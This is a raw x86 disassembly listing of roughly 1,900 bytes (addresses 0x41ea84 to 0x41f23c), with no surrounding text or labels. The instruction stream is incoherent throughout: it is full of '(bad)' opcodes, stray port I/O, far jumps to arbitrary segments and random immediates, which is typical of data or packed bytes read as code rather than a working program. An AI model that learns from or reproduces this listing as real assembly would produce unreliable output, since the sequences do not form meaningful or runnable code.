  41ea84:	xchg   edx,eax
  41ea85:	lock pop eax
  41ea87:	sbb    al,0xf
  41ea89:	and    bl,BYTE PTR [edi+0xa]
  41ea8c:	es push esi
  41ea8e:	scas   al,BYTE PTR es:[edi]
  41ea8f:	cmp    DWORD PTR [ecx-0x7419e630],esi
  41ea95:	mov    dh,0xb4
  41ea97:	mov    ds:0x9df089e0,al
  41ea9c:	je     0x41eaa7
  41ea9e:	or     ebp,edx
  41eaa0:	dec    edx
  41eaa1:	sub    eax,0xd3edeee3
  41eaa6:	jne    0x41ea54
  41eaa8:	fbstp  TBYTE PTR [eax+0x35]
  41eaab:	mov    esi,0x72c54523
  41eab0:	into   
  41eab1:	push   0xf6db9a00
  41eab6:	shr    bh,1
  41eab8:	xor    al,BYTE PTR [edi-0x2dc10add]
  41eabe:	stos   DWORD PTR es:[edi],eax
  41eabf:	or     BYTE PTR [edi],ah
  41eac1:	mov    esi,0xb794e953
  41eac6:	fnstsw WORD PTR [esp+ebp*8+0x60]
  41eaca:	ja     0x41eb11
  41eacc:	push   ds
  41eacd:	pop    eax
  41eace:	pusha  
  41eacf:	enter  0x89c0,0x5f
  41ead3:	in     eax,dx
  41ead4:	shr    DWORD PTR [eax],1
  41ead6:	es jge 0x41ea60
  41ead9:	xchg   esi,eax
  41eada:	adc    al,0x80
  41eadc:	jp     0x41eadd
  41eade:	cmp    al,0xb3
  41eae0:	stos   DWORD PTR es:[edi],eax
  41eae1:	jle    0x41eb1b
  41eae3:	ins    BYTE PTR es:[edi],dx
  41eae4:	fdivp  st(1),st
  41eae6:	fdivr  DWORD PTR ds:0x915b3af5
  41eaec:	fs ss jae 0x41eacb
  41eaf0:	mov    edx,0xa05f6fc6
  41eaf5:	jne    0x41eaa8
  41eaf7:	and    al,0x25
  41eaf9:	mov    DWORD PTR [ebp+0xbf43adf],ebx
  41eaff:	cmp    eax,0x32a5feaa
  41eb04:	ret    0x1cf1
  41eb07:	shl    ch,0x6e
  41eb0a:	std    
  41eb0b:	pop    esi
  41eb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb0d:	iret   
  41eb0e:	fadd   DWORD PTR [eax]
	...
  41eb18:	add    BYTE PTR [eax],al
  41eb1a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb21:	popf   
  41eb22:	aam    0x57
  41eb24:	(bad)
  41eb28:	mov    DWORD PTR [ebp-0x14],0x18e6b
  41eb2f:	lods   al,BYTE PTR ds:[esi]
  41eb30:	add    BYTE PTR [eax],al
  41eb32:	add    BYTE PTR ds:0x3566b905,bh
  41eb38:	(bad)  
  41eb3a:	dec    ebp
  41eb3b:	test   bh,dl
  41eb3d:	sub    edx,DWORD PTR [ebp-0x80]
  41eb40:	sbb    bh,BYTE PTR [edx]
  41eb42:	lods   eax,DWORD PTR ds:[esi]
  41eb43:	arpl   WORD PTR [ebx-0x47],bx
  41eb46:	cmp    al,0xc6
  41eb48:	pop    esp
  41eb49:	ins    DWORD PTR es:[edi],dx
  41eb4a:	or     DWORD PTR [eax+edx*2-0x7c],ebp
  41eb4e:	jmp    0x41eb19
  41eb50:	push   esi
  41eb51:	aam    0xea
  41eb53:	mov    dh,0x1b
  41eb55:	mov    ds:0xa3751f69,al
  41eb5a:	mov    eax,0x6480a480
  41eb5f:	out    dx,al
  41eb60:	ss add ch,0x26
  41eb64:	(bad)  [ecx-0x3c]
  41eb67:	mov    ds:0xa981f3f5,al
  41eb6c:	rcr    BYTE PTR ds:0x6cc1422e,1
  41eb72:	call   0xb42:0x83c69ad6
  41eb79:	stc    
  41eb7a:	leave  
  41eb7b:	sbb    ch,0x9f
  41eb7e:	rcr    BYTE PTR [ecx],cl
  41eb80:	pop    ecx
  41eb81:	das    
  41eb82:	test   DWORD PTR [ebx-0x74519247],ebp
  41eb88:	sahf   
  41eb89:	mov    edx,0xe66caebb
  41eb8e:	push   esp
  41eb8f:	adc    dh,0xb3
  41eb92:	dec    ebp
  41eb93:	std    
  41eb94:	sub    BYTE PTR [edx+0x70],0x3f
  41eb98:	int3   
  41eb99:	lahf   
  41eb9a:	pop    esp
  41eb9b:	ins    DWORD PTR es:[edi],dx
  41eb9c:	jg     0x41ebfd
  41eb9e:	ds dec ebp
  41eba0:	mov    cl,0x5e
  41eba2:	dec    edi
  41eba3:	dec    esi
  41eba4:	hlt    
  41eba5:	xor    dh,ah
  41eba7:	das    
  41eba8:	test   edi,ebp
  41ebaa:	dec    ecx
  41ebab:	sub    ecx,ecx
  41ebad:	popa   
  41ebae:	ret    0x7405
  41ebb1:	arpl   WORD PTR [ebp+0xff4478a],si
  41ebb7:	lods   eax,DWORD PTR ds:[esi]
  41ebb8:	sbb    DWORD PTR [esi-0x4c],0x67
  41ebbc:	pop    edx
  41ebbd:	mov    al,ds:0x7793c25b
  41ebc2:	mov    esp,0xb6d4bec2
  41ebc7:	adc    edx,esi
  41ebc9:	or     bl,cl
  41ebcb:	inc    edi
  41ebcc:	sbb    ch,BYTE PTR [ebx*4+0x5aeee675]
  41ebd3:	mov    ecx,0xc011b3ce
  41ebd8:	adc    DWORD PTR ss:[eax-0x8],ebp
  41ebdc:	ss ret 0x2
	...
  41ebe8:	add    BYTE PTR [eax],al
  41ebea:	add    ah,dh
  41ebec:	mov    dl,0x32
  41ebee:	(bad)  
  41ebef:	jbe    0x41ebc7
  41ebf1:	hlt    
  41ebf2:	mov    dl,0xb1
  41ebf4:	and    al,0xfe
  41ebf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebf7:	es push ecx
  41ebf9:	sub    eax,0x18f1760
  41ebfe:	add    BYTE PTR [eax+eax*1-0x41600000],ch
  41ec05:	out    dx,al
  41ec06:	add    ebx,esp
  41ec08:	pop    es
  41ec09:	outs   dx,DWORD PTR ds:[esi]
  41ec0a:	xabort 0x5b
  41ec0d:	int    0xf
  41ec0f:	test   DWORD PTR [esi+esi*2],eax
  41ec12:	mov    esp,DWORD PTR [eax]
  41ec14:	or     al,bh
  41ec16:	ins    DWORD PTR es:[edi],dx
  41ec17:	retf   
  41ec18:	push   edi
  41ec19:	fadd   QWORD PTR gs:[ebx]
  41ec1c:	xor    BYTE PTR [ebx],0x38
  41ec1f:	je     0x41ebcd
  41ec21:	cmp    eax,0x91ac4bb4
  41ec26:	or     DWORD PTR [ecx-0x14f85ed9],ecx
  41ec2c:	xchg   ecx,eax
  41ec2d:	sti    
  41ec2e:	add    eax,0xd2e4688a
  41ec33:	rcl    ecx,cl
  41ec35:	iret   
  41ec36:	jnp    0x41ebfb
  41ec38:	imul   esi,DWORD PTR [edi-0x2f],0x807bbdbe
  41ec3f:	sub    dl,ch
  41ec41:	jae    0x41ec70
  41ec43:	mov    cl,0x25
  41ec45:	push   cs
  41ec46:	bound  edi,QWORD PTR ds:0x15821bc6
  41ec4c:	xor    ch,BYTE PTR [edx+esi*4]
  41ec4f:	jmp    0x6423:0xaa9aff18
  41ec56:	xchg   esi,eax
  41ec57:	or     eax,0xf69c02d5
  41ec5c:	mov    ch,dl
  41ec5e:	data16 jae 0x41ec9b
  41ec61:	and    DWORD PTR [ebx+ebp*1+0x53],0x1380d590
  41ec69:	or     ebp,DWORD PTR [esi+0x45f64cbd]
  41ec6f:	sub    al,0xfc
  41ec71:	fnstenv [ebx]
  41ec73:	bound  ecx,QWORD PTR [eax+0x5e]
  41ec76:	les    ebp,FWORD PTR [ecx-0x7]
  41ec79:	ret    
  41ec7a:	adc    dh,BYTE PTR [ebp-0x3c]
  41ec7d:	dec    ecx
  41ec7e:	mov    WORD PTR [esi-0x4dddb302],fs
  41ec84:	lea    eax,[edx-0x20bb3fd9]
  41ec8a:	mov    ch,0xf2
  41ec8c:	fdiv   QWORD PTR [ebx+eiz*1]
  41ec8f:	push   ss
  41ec90:	das    
  41ec91:	(bad)  
  41ec93:	pop    ds
  41ec94:	and    ebx,DWORD PTR [esi+esi*1+0x1b2a171d]
  41ec9b:	xchg   ebp,eax
  41ec9c:	sbb    BYTE PTR [ecx+0x0],ah
  41ec9f:	repz retf 0x2060
  41eca3:	inc    eax
  41eca4:	mov    cl,0x54
  41eca6:	inc    ebx
  41eca7:	out    0x1,eax
  41eca9:	push   0xfca6b5fe
  41ecae:	cmp    BYTE PTR [eax],al
	...
  41ecb8:	add    BYTE PTR [eax],al
  41ecba:	add    BYTE PTR [edx],dh
  41ecbc:	ror    esi,cl
  41ecbe:	mov    ds:0xd37ebfef,al
  41ecc3:	sub    edi,DWORD PTR [esi]
  41ecc5:	out    0x3f,eax
  41ecc7:	dec    ebx
  41ecc8:	cmp    ebp,esi
  41ecca:	inc    bl
  41eccc:	pop    DWORD PTR [ecx]
  41ecce:	add    BYTE PTR [eax+eax*1-0x22110000],ch
  41ecd5:	scas   eax,DWORD PTR es:[edi]
  41ecd6:	retf   0x57d7
  41ecd9:	sub    cl,bh
  41ecdb:	or     bh,ah
  41ecdd:	iret   
  41ecde:	ror    DWORD PTR [edx],cl
  41ece0:	pushf  
  41ece1:	sbb    eax,DWORD PTR [ebx+0x16]
  41ece4:	cmp    eax,0x96f319fd
  41ece9:	mov    ch,0x74
  41ecec:	jmp    0x638e8e79
  41ecf1:	pusha  
  41ecf2:	ror    DWORD PTR [eax],1
  41ecf4:	sbb    BYTE PTR [esi],0x3c
  41ecf7:	daa    
  41ecf8:	mov    eax,ds:0x37e136ee
  41ecfd:	or     DWORD PTR [ebp-0x609f8acb],ebp
  41ed03:	out    dx,al
  41ed04:	inc    edi
  41ed05:	or     BYTE PTR [esi],ch
  41ed07:	xchg   esi,eax
  41ed08:	fild   DWORD PTR [esi]
  41ed0a:	hlt    
  41ed0b:	outs   dx,DWORD PTR ds:[esi]
  41ed0c:	sahf   
  41ed0d:	(bad)  [ebx+0x41]
  41ed10:	fucomi st,st(0)
  41ed12:	add    edx,DWORD PTR [eax+0x49]
  41ed15:	imul   esi,DWORD PTR [ebx],0xffffffa6
  41ed18:	es jle 0x41ed84
  41ed1b:	dec    edx
  41ed1c:	inc    ebx
  41ed1d:	mov    bh,0xd7
  41ed1f:	cmp    bl,0x4f
  41ed22:	push   esi
  41ed23:	jno    0x41ed1d
  41ed25:	pop    edi
  41ed26:	frstor [eax+0x7d4b10ce]
  41ed2c:	aad    0x12
  41ed2e:	push   esp
  41ed2f:	jecxz  0x41ed24
  41ed31:	push   0x5a
  41ed33:	mov    ch,bl
  41ed35:	mov    eax,ds:0xd6ffca59
  41ed3a:	and    esp,DWORD PTR [edi+ebp*1]
  41ed3d:	xor    bh,BYTE PTR [ebx]
  41ed3f:	div    BYTE PTR [edi+0x6a735de6]
  41ed45:	hlt    
  41ed46:	push   edi
  41ed47:	sbb    eax,0x7d2e6a33
  41ed4c:	div    esi
  41ed4e:	fst    DWORD PTR [ebx+0x297ca2f4]
  41ed54:	(bad)  
  41ed55:	cmp    BYTE PTR [eax-0x7d],dh
  41ed58:	add    ebp,DWORD PTR [edx]
  41ed5a:	enter  0x1025,0x71
  41ed5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed5f:	rcl    DWORD PTR fs:[ebp+ecx*4+0x3d],0x7a
  41ed65:	ins    DWORD PTR es:[edi],dx
  41ed66:	mov    al,0x3a
  41ed68:	or     eax,0x391ae6d2
  41ed6d:	inc    eax
  41ed6e:	sbb    esp,DWORD PTR [edi]
  41ed70:	fld    QWORD PTR [ebx]
  41ed72:	or     al,0x9c
  41ed74:	fwait
  41ed75:	push   esp
  41ed76:	mov    ah,0x59
  41ed78:	cmp    al,0xe
  41ed7a:	loope  0x41ed92
  41ed7c:	push   es
  41ed7d:	mov    al,ds:0x3c
	...
  41ed8a:	add    bl,bl
  41ed8c:	in     eax,dx
  41ed8d:	outs   dx,BYTE PTR ds:[esi]
  41ed8e:	and    bh,BYTE PTR [esi-0x5d]
  41ed91:	(bad)  
  41ed93:	pop    esi
  41ed94:	(bad)  
  41ed95:	mov    DWORD PTR [ebp+0x2bfe1443],ecx
  41ed9b:	outs   dx,DWORD PTR ds:[esi]
  41ed9c:	nop
  41ed9d:	add    DWORD PTR [eax],eax
  41ed9f:	lods   al,BYTE PTR ds:[esi]
  41eda0:	add    BYTE PTR [eax],al
  41eda2:	add    cl,bh
  41eda4:	lea    esi,[edi-0x1e9a665b]
  41edaa:	sub    dl,BYTE PTR [ecx+0xf]
  41edad:	arpl   WORD PTR [edx-0x64],bx
  41edb0:	in     al,dx
  41edb1:	lea    edi,[esi-0x1381a3f3]
  41edb7:	xchg   ebx,eax
  41edb8:	push   ebx
  41edb9:	fst    DWORD PTR [ecx+eax*4-0x2a]
  41edbd:	out    dx,eax
  41edbe:	(bad)  
  41edc0:	xchg   esp,eax
  41edc1:	daa    
  41edc2:	jo     0x41ee2f
  41edc4:	add    eax,0xf1124aa0
  41edc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edca:	adc    eax,0x98f4f5ed
  41edcf:	(bad)  
  41edd0:	sahf   
  41edd1:	leave  
  41edd2:	jae    0x41ee13
  41edd4:	test   BYTE PTR gs:[ebx-0x1b],bl
  41edd8:	sbb    BYTE PTR [ebp+0x37703214],dh
  41edde:	sub    BYTE PTR [esi-0x15c7fc76],bh
  41ede4:	stos   BYTE PTR es:[edi],al
  41ede5:	shl    DWORD PTR [edx-0x53351c64],1
  41edeb:	ja     0x41ee0b
  41eded:	(bad)  
  41edef:	adc    ah,dl
  41edf1:	add    DWORD PTR [edi+0x44],eax
  41edf4:	addr16 retf 
  41edf6:	mov    bh,0xe6
  41edf8:	aas    
  41edf9:	mov    ?,WORD PTR [eax]
  41edfb:	mov    edi,0xca1872d1
  41ee00:	popa   
  41ee01:	out    0xe1,al
  41ee03:	test   al,0x85
  41ee05:	fwait
  41ee06:	sub    eax,0x97d16ec4
  41ee0b:	or     BYTE PTR [edi+0x28],bl
  41ee0e:	ins    DWORD PTR es:[edi],dx
  41ee0f:	sub    DWORD PTR ds:[eax+0x5e2e25b2],esp
  41ee16:	mov    esi,esp
  41ee18:	dec    ebx
  41ee19:	jecxz  0x41edf0
  41ee1b:	jmp    0x4668:0x57085457
  41ee22:	std    
  41ee23:	fstp   QWORD PTR [edx+0x10]
  41ee26:	mov    edx,0x38cce9c9
  41ee2b:	add    edi,DWORD PTR [ebx+0x19]
  41ee2e:	mul    DWORD PTR [ecx+0x6565350a]
  41ee34:	sbb    esi,esi
  41ee36:	bound  eax,QWORD PTR [ebp+0x43]
  41ee39:	retf   0x94dd
  41ee3c:	pop    eax
  41ee3d:	fst    QWORD PTR [ebp-0x17e530b3]
  41ee43:	rol    BYTE PTR [edx+0x70],0xfe
  41ee47:	push   ebp
  41ee48:	je     0x41edfb
  41ee4a:	xchg   esp,eax
  41ee4b:	test   DWORD PTR [ebx+0xf639],ebp
	...
  41ee59:	add    BYTE PTR [eax],al
  41ee5b:	add    eax,0x6f976b22
  41ee60:	(bad)  
  41ee62:	mov    dl,0x66
  41ee64:	and    BYTE PTR [esi-0x69e3b796],ah
  41ee6a:	jno    0x41ee87
  41ee6c:	xchg   ecx,eax
  41ee6d:	add    DWORD PTR [eax],eax
  41ee6f:	lods   al,BYTE PTR ds:[esi]
  41ee70:	add    BYTE PTR [eax],al
  41ee72:	add    BYTE PTR [ebp+0x4cfbe5aa],dl
  41ee78:	cmp    DWORD PTR ds:0xbe96b252,eax
  41ee7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee7f:	cwde   
  41ee80:	sbb    eax,0x4c332c32
  41ee85:	imul   BYTE PTR [edx-0x258eb74c]
  41ee8b:	icebp  
  41ee8c:	mov    al,ds:0x1f8f43b8
  41ee91:	sbb    DWORD PTR [edx+0x3a],edx
  41ee94:	sub    BYTE PTR [esi],bh
  41ee96:	imul   ebx,eax,0x774eb244
  41ee9c:	or     eax,0xfd7d315f
  41eea1:	or     ch,BYTE PTR [edi+0x7357a131]
  41eea7:	or     ah,BYTE PTR [ecx]
  41eea9:	iret   
  41eeaa:	push   0xc87bfefc
  41eeaf:	test   BYTE PTR [ebx+0x6e02143d],cl
  41eeb5:	pushf  
  41eeb6:	or     bl,BYTE PTR [esi]
  41eeb8:	ficom  DWORD PTR ss:[edx+0x60]
  41eebc:	in     al,0x90
  41eebe:	inc    ecx
  41eebf:	pop    edx
  41eec0:	push   ds
  41eec1:	push   edx
  41eec2:	imul   esi,DWORD PTR [edi+0x69],0x52887bea
  41eec9:	dec    eax
  41eeca:	outs   dx,DWORD PTR ds:[esi]
  41eecb:	xchg   edi,eax
  41eecc:	mov    dl,0x28
  41eece:	adc    DWORD PTR [esi-0x7bb2732f],ebx
  41eed4:	mov    ah,0x15
  41eed6:	lds    edx,FWORD PTR [ecx+0x45]
  41eed9:	cmp    eax,0x888a50b8
  41eede:	and    DWORD PTR [eax+0x3f3264e7],ecx
  41eee4:	mov    bh,0x3a
  41eee6:	sbb    DWORD PTR ds:0x2b2adae4,esi
  41eeec:	out    dx,eax
  41eeed:	add    eax,esi
  41eeef:	jae    0x41ef0a
  41eef1:	test   al,0x4
  41eef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef4:	jp     0x41eef1
  41eef6:	imul   esp,DWORD PTR [ebp+ecx*4-0x64],0x2c6057a3
  41eefe:	xchg   esp,eax
  41eeff:	adc    BYTE PTR [ebp+0x48],bh
  41ef02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef03:	pop    ecx
  41ef04:	idiv   DWORD PTR [edi+0x72e1b4be]
  41ef0a:	loope  0x41ef41
  41ef0c:	stc    
  41ef0d:	mov    ah,0x52
  41ef0f:	adc    DWORD PTR [esi-0x1b],esp
  41ef12:	adc    DWORD PTR [esi],0x1228e765
  41ef18:	xchg   ebp,eax
  41ef19:	jmp    0x4:0xe3010eba
	...
  41ef28:	add    BYTE PTR [eax],al
  41ef2a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef30:	stc    
  41ef31:	call   esi
  41ef33:	into   
  41ef34:	inc    ebp
  41ef35:	mov    bh,0x11
  41ef37:	test   BYTE PTR [esi],ah
  41ef39:	inc    esp
  41ef3a:	mov    edi,0x191c7
  41ef3f:	lods   al,BYTE PTR ds:[esi]
  41ef40:	add    BYTE PTR [eax],al
  41ef42:	add    BYTE PTR [esi-0x179802c8],ch
  41ef48:	xor    edi,DWORD PTR [esi+0xa]
  41ef4b:	lock retf 
  41ef4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef4e:	int3   
  41ef4f:	lds    edi,FWORD PTR [eax+0x33c5ddd1]
  41ef55:	loop   0x41ef84
  41ef57:	or     BYTE PTR [ecx],bh
  41ef59:	pusha  
  41ef5a:	scas   al,BYTE PTR es:[edi]
  41ef5b:	cmp    ah,BYTE PTR [esi+0x44]
  41ef5e:	push   ds
  41ef5f:	dec    ebp
  41ef60:	call   FWORD PTR [edx+0x77eee218]
  41ef66:	pop    ebp
  41ef67:	add    esp,eax
  41ef69:	push   ss
  41ef6a:	(bad)  
  41ef6b:	xchg   ebx,eax
  41ef6c:	xor    DWORD PTR [bx+si+0x64eb],edi
  41ef71:	push   ecx
  41ef72:	mov    cl,0x9b
  41ef74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef75:	jns    0x41ef38
  41ef77:	mov    ah,0xd4
  41ef79:	xlat   BYTE PTR ds:[ebx]
  41ef7a:	test   eax,0xbeb0199f
  41ef7f:	sub    eax,0xfbbc1d80
  41ef84:	fidiv  WORD PTR ds:0xcbf66469
  41ef8a:	mov    ah,0x5f
  41ef8c:	addr16 push eax
  41ef8e:	and    al,0x7c
  41ef90:	sub    ebx,edx
  41ef92:	fwait
  41ef93:	je     0x41efae
  41ef95:	dec    edx
  41ef96:	inc    ebx
  41ef97:	push   cs
  41ef98:	mov    DWORD PTR [edi],ecx
  41ef9a:	retf   
  41ef9b:	ds sahf 
  41ef9d:	js     0x41f00e
  41ef9f:	lods   al,BYTE PTR ds:[esi]
  41efa0:	jp     0x41efc1
  41efa2:	fsubr  DWORD PTR [eax+0x3a16e6b7]
  41efa8:	pop    es
  41efa9:	xor    al,0x62
  41efab:	jmp    0xc0f3:0x8160bfcf
  41efb2:	or     ebx,ecx
  41efb4:	inc    edi
  41efb5:	push   edi
  41efb6:	shl    DWORD PTR [edi+eiz*4+0x34c0d383],1
  41efbd:	in     eax,0x46
  41efbf:	pop    ebx
  41efc0:	mov    dh,0xeb
  41efc2:	sbb    eax,0x32c46a07
  41efc7:	rol    DWORD PTR [ecx+0x15],cl
  41efca:	inc    eax
  41efcb:	dec    ebx
  41efcc:	imul   esi,DWORD PTR [ecx-0x7e],0xffffffaa
  41efd0:	and    eax,DWORD PTR [ecx+ebx*4-0x20]
  41efd4:	outs   dx,BYTE PTR ds:[esi]
  41efd5:	repz pushw ss
  41efd8:	clc    
  41efd9:	push   ebx
  41efda:	ret    0x5646
  41efdd:	sub    BYTE PTR [ebx+eiz*8],al
  41efe0:	sbb    ah,BYTE PTR [edx-0x19b3a147]
  41efe6:	ret    
  41efe7:	fidivr WORD PTR [ecx-0x514bc885]
  41efed:	sub    dh,BYTE PTR [ecx]
	...
  41effb:	fisubr WORD PTR [ecx]
  41effd:	cwde   
  41effe:	sar    bh,cl
  41f000:	repz fisubr WORD PTR ds:0x4af35f6
  41f007:	fld    st(7)
  41f009:	into   
  41f00a:	leave  
  41f00b:	jae    0x41ef9f
  41f00d:	add    DWORD PTR [eax],eax
  41f00f:	lods   al,BYTE PTR ds:[esi]
  41f010:	add    BYTE PTR [eax],al
  41f012:	add    BYTE PTR [edi+ebp*2],ch
  41f015:	add    eax,0xa56f51bd
  41f01a:	add    BYTE PTR ds:0xa655c973,0xcc
  41f021:	lods   eax,DWORD PTR ds:[esi]
  41f022:	cmp    al,0x57
  41f024:	jae    0x41efd1
  41f026:	add    eax,0xa4b9a45b
  41f02b:	add    DWORD PTR [eax+0x1d],edi
  41f02e:	xor    BYTE PTR [ebx-0x3eb67c94],dh
  41f034:	dec    BYTE PTR [esi+0x49d25032]
  41f03a:	xor    ah,BYTE PTR [edx]
  41f03c:	push   eax
  41f03e:	fnstsw WORD PTR [edi-0x1f]
  41f041:	sahf   
  41f042:	mov    ds:0xd9a1cfe8,eax
  41f047:	adc    eax,0x5f6f3bb
  41f04c:	xor    esi,DWORD PTR [edx+eiz*2+0x71146cd4]
  41f053:	sub    al,0x3c
  41f055:	icebp  
  41f056:	pop    esp
  41f057:	jg     0x41f09b
  41f059:	pop    esi
  41f05a:	arpl   dx,di
  41f05c:	cmp    eax,0x4fb1b11c
  41f061:	pop    eax
  41f062:	in     al,0x5a
  41f064:	js     0x41f043
  41f066:	or     al,0xbb
  41f068:	arpl   WORD PTR ds:0x9de67857,cx
  41f06e:	scas   al,BYTE PTR es:[edi]
  41f06f:	jae    0x41eff3
  41f071:	cmp    eax,0x49b3a95d
  41f076:	adc    BYTE PTR [ebx-0x6d326587],al
  41f07c:	fwait
  41f07d:	js     0x41f075
  41f07f:	sbb    DWORD PTR [ecx+0x38],esi
  41f082:	jp     0x41f0b4
  41f084:	ins    DWORD PTR es:[edi],dx
  41f085:	xor    DWORD PTR [esi+0x52],ebp
  41f088:	mov    ah,0x5c
  41f08a:	cld    
  41f08b:	and    bh,BYTE PTR [edi+0x69fffae8]
  41f091:	call   0x51b1:0x94ecca
  41f098:	dec    edx
  41f099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f09a:	das    
  41f09b:	mov    esi,0xdcc358c0
  41f0a0:	pop    eax
  41f0a1:	mov    bl,0xa9
  41f0a3:	cmp    eax,0x6370d23a
  41f0a8:	cs clc 
  41f0aa:	mov    edi,0x6f7b9e3
  41f0af:	adc    eax,0x88b22872
  41f0b4:	pop    eax
  41f0b5:	mov    edx,0x7c92e1ff
  41f0ba:	enter  0xf935,0xb1
  41f0be:	fiadd  WORD PTR [eax]
	...
  41f0c8:	add    BYTE PTR [eax],al
  41f0ca:	add    BYTE PTR [esi+0x3f],cl
  41f0cd:	int3   
  41f0ce:	sbb    eax,0x7fdffffd
  41f0d3:	out    dx,eax
  41f0d4:	loopne 0x41f0ec
  41f0d6:	lods   al,BYTE PTR ds:[esi]
  41f0d7:	dec    edx
  41f0d8:	stos   BYTE PTR es:[edi],al
  41f0d9:	add    ch,bl
  41f0db:	pop    ds
  41f0dc:	xchg   ebx,eax
  41f0dd:	add    DWORD PTR [eax],eax
  41f0df:	lods   al,BYTE PTR ds:[esi]
  41f0e0:	add    BYTE PTR [eax],al
  41f0e2:	add    bl,ah
  41f0e4:	fldcw  WORD PTR [edx+0x49]
  41f0e7:	and    al,0xc3
  41f0e9:	and    BYTE PTR [eax],0x48
  41f0ec:	cs jge 0x41f0a0
  41f0ef:	fidivr DWORD PTR [ebx-0x41c9a5ef]
  41f0f5:	pop    esp
  41f0f6:	test   ch,ch
  41f0f8:	push   esp
  41f0f9:	jp     0x41f12f
  41f0fb:	addr16 repz push 0xfffffff2
  41f0ff:	sub    ecx,ebp
  41f101:	xor    ebp,DWORD PTR [esi+0x749e1ec4]
  41f107:	cli    
  41f108:	or     bl,al
  41f10a:	cli    
  41f10b:	enter  0x3cc,0x6
  41f10f:	adc    eax,0xbb6e4439
  41f114:	mov    edi,0x7ddb5720
  41f119:	not    BYTE PTR [ebp+0x726bc882]
  41f11f:	push   edi
  41f120:	sbb    eax,0xa87d48e3
  41f125:	mov    ds:0x44040e78,eax
  41f12a:	push   eax
  41f12b:	mov    bl,0xf9
  41f12d:	mov    edx,0xd9597da0
  41f132:	ss inc ecx
  41f134:	or     DWORD PTR [esi+0xc],esp
  41f137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f138:	ins    BYTE PTR es:[edi],dx
  41f139:	mov    ecx,0xe2e938db
  41f13e:	xchg   ecx,eax
  41f13f:	cli    
  41f140:	popa   
  41f141:	sbb    eax,0x495c27d2
  41f146:	(bad)  
  41f147:	scas   eax,DWORD PTR es:[edi]
  41f148:	int3   
  41f149:	in     al,0x15
  41f14b:	out    dx,al
  41f14c:	cmc    
  41f14d:	mov    BYTE PTR [eax-0x21],bl
  41f150:	out    0x3d,eax
  41f152:	xor    al,0x7e
  41f154:	test   dh,0x26
  41f157:	adc    BYTE PTR [ecx+0x373131fa],bl
  41f15d:	add    cl,BYTE PTR [ebx-0x210d12ea]
  41f163:	retf   0xe87a
  41f166:	scas   eax,DWORD PTR es:[edi]
  41f167:	sbb    ah,BYTE PTR [edi]
  41f169:	and    BYTE PTR [ecx+eiz*8-0x7ae4bdb],bh
  41f170:	mov    bl,ah
  41f172:	dec    esp
  41f173:	and    ah,ch
  41f175:	shr    BYTE PTR [ecx+esi*8-0x51f36c73],cl
  41f17c:	arpl   WORD PTR [ecx],di
  41f17e:	cmp    ecx,DWORD PTR [esi]
  41f180:	adc    DWORD PTR [ecx],edx
  41f182:	adc    eax,edi
  41f184:	pusha  
  41f185:	xchg   BYTE PTR [esi-0x26bc5db9],dl
  41f18b:	outs   dx,DWORD PTR ds:[esi]
  41f18c:	gs out dx,al
  41f18e:	cmp    BYTE PTR [eax],al
	...
  41f198:	add    BYTE PTR [eax],al
  41f19a:	add    BYTE PTR [esi],bl
  41f19c:	test   eax,0x7ff735f6
  41f1a1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1a7:	xor    esi,DWORD PTR [ebx]
  41f1a9:	xchg   esp,eax
  41f1aa:	mov    esi,0x193cb
  41f1af:	lods   al,BYTE PTR ds:[esi]
  41f1b0:	add    BYTE PTR [eax],al
  41f1b2:	add    BYTE PTR [edx],bl
  41f1b4:	data16 hlt 
  41f1b6:	imul   ebp,edx,0x413dc846
  41f1bc:	ins    BYTE PTR es:[edi],dx
  41f1bd:	lahf   
  41f1be:	mov    BYTE PTR [edi+0x70f2008e],bh
  41f1c4:	inc    edi
  41f1c5:	test   ch,cl
  41f1c7:	inc    edi
  41f1c8:	add    DWORD PTR ds:0xa3ee64f3,esp
  41f1ce:	xchg   ebp,eax
  41f1cf:	inc    ecx
  41f1d0:	into   
  41f1d1:	push   ecx
  41f1d2:	test   DWORD PTR [ecx],ecx
  41f1d4:	mov    al,ds:0xd5e08da5
  41f1d9:	imul   ebx,esp,0xe6032826
  41f1df:	push   cs
  41f1e0:	fsubr  DWORD PTR [edi+ebp*4-0x6c]
  41f1e4:	fistp  DWORD PTR [eax]
  41f1e6:	jb     0x41f22f
  41f1e8:	mov    bl,dl
  41f1ea:	aaa    
  41f1eb:	fst    DWORD PTR [edx-0x6a]
  41f1ee:	jae    0x41f1a0
  41f1f0:	mov    eax,ds:0x78cd8b72
  41f1f5:	shl    DWORD PTR [edx+0x6d],cl
  41f1f8:	sbb    eax,0x552f07e0
  41f1fd:	int3   
  41f1fe:	out    0x3f,eax
  41f200:	cli    
  41f201:	sahf   
  41f202:	mov    dh,0xfb
  41f204:	pop    ss
  41f205:	call   0xc8e0feed
  41f20a:	gs xchg edx,eax
  41f20c:	xchg   ecx,eax
  41f20d:	cmp    BYTE PTR [edx-0x7c],cl
  41f210:	mov    edi,DWORD PTR [eax-0x34]
  41f213:	dec    esp
  41f214:	ror    BYTE PTR [ebp-0x7223888d],1
  41f21a:	pop    eax
  41f21b:	mov    ebp,0x73464042
  41f220:	cld    
  41f221:	mov    eax,esp
  41f223:	fist   WORD PTR [ebx-0x22570daf]
  41f229:	push   ebp
  41f22a:	pop    ebx
  41f22b:	ins    DWORD PTR es:[edi],dx
  41f22c:	retf   0x5d82
  41f22f:	sahf   
  41f230:	sbb    BYTE PTR [ebx+edi*2+0x72],dl
  41f234:	(bad)  
  41f235:	not    BYTE PTR [eax]
  41f237:	mov    eax,0x8712c3
  41f23c:	mov    ds:0xc2bb7175,eax
